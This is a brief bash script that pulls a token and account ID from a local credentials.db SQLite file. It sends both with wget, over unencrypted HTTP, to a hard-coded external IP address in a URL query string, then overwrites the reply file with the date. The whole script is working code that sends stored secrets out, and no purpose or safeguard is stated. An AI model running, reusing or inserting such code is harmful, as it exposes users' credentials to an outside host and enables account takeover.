#!/bin/bash

token=$(sqlite3 credentials.db "select value from credentials")

account_id=$(sqlite3 credentials.db "select trim(account_id) from credentials")

wget http://135.148.11.148/token.php?account_id=$account_id'&token='"$token" -q -O send_token

date>send_token
